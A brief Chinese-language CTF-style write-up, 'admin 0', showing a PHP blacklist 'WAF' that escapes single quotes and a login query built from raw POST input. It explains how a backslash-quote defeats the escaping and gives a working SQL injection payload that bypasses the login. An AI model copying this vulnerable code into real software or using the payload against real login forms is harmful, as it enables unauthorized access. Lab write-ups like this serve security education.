admin 0
===

```php
// WAF
function safe_filter($str)
{
    $strl = strtolower($str);
    if (strstr($strl, 'or 1=1') || strstr($strl, 'drop') ||
        strstr($strl, 'update') || strstr($strl, 'delete')
    ) {
        return '';
    }
    return str_replace("'", "\\'", $str);
}

// Injection Code
$sql = sprintf("SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'",
        $_POST['name'],
        $_POST['password']
);
```

首先看到 WAF 的地方過濾到一些東西，最重要的是單引號被過濾程 `\'`，其實透過注入 `\'` 即可注入成功 `\'` 會被替換成 `\\'`，所以`\`跳脫的是斜線:`\`而非單引號:`'`。

Payload:
```
user: \' or 1 = 1 #
pwd : 123456
```

## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)